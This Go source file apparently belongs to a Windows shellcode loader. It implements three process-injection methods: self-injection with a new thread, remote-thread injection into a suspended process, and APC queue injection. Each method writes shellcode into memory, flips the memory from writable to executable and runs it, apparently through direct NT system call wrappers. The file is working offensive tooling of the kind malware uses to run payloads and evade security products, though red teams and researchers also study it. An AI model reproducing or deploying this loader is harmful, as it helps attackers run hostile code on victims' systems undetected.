// + build windows

package loader

import (
	"fmt"

	"golang.org/x/sys/windows"
)

func (ldr *loader) selfInjectThread(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
		hThread    uintptr
	)
	hSelf := uintptr(0xffffffffffffffff) // handle to current proc
	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
		hSelf,
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	// writeMemory(scbuf, scBaseAddr)
	if _, err := ldr.NtWriteVirtualMemory(hSelf, scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Shellcode copied to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := ldr.NtProtectVirtualMemory(hSelf, scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Creating thread to exec shellcode ...")
	hThread, err = ldr.NtCreateThreadEx(hThread, hSelf, scBaseAddr)
	if err != nil {
		return err
	}

	windows.WaitForSingleObject(windows.Handle(hThread), 0xffffffff)

	fmt.Println("Injection complted succesfully")
	return nil
}

func (ldr *loader) remoteThreadInject(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
	)

	fmt.Println("Creating suspended process ...")
	pi, err := createSuspendedProcess()
	if err != nil {
		return err
	}

	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
		uintptr(pi.Process),
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	// writeMemory(scbuf, scBaseAddr)
	if _, err := ldr.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Shellcode copied to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := ldr.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Creating thread to exec shellcode ...")
	_, err = ldr.NtCreateThreadEx(uintptr(pi.Thread), uintptr(pi.Process), scBaseAddr)
	if err != nil {
		return err
	}

	fmt.Println("Closing thread handle ...")
	if err := windows.Close(windows.Handle(pi.Process)); err != nil {
		return err
	}

	fmt.Println("Injection completed succesfully!")
	return nil
}

func (ldr *loader) queueUserAPC(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
	)

	pi, err := createSuspendedProcess()
	if err != nil {
		return err
	}
	fmt.Printf("Created suspended process ...\n")

	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
		uintptr(pi.Process),
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	if _, err := ldr.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Writing shellcode to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := ldr.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Adding thread to APC queue ...")
	if _, err := ldr.NtQueueApcThread(uintptr(pi.Thread), scBaseAddr); err != nil {
		return err
	}

	fmt.Println("Resuming thread to execute shellcode...")
	if _, err := windows.ResumeThread(windows.Handle(pi.Thread)); err != nil {
		return err
	}

	fmt.Println("Injection completed succesfully")
	return nil
}
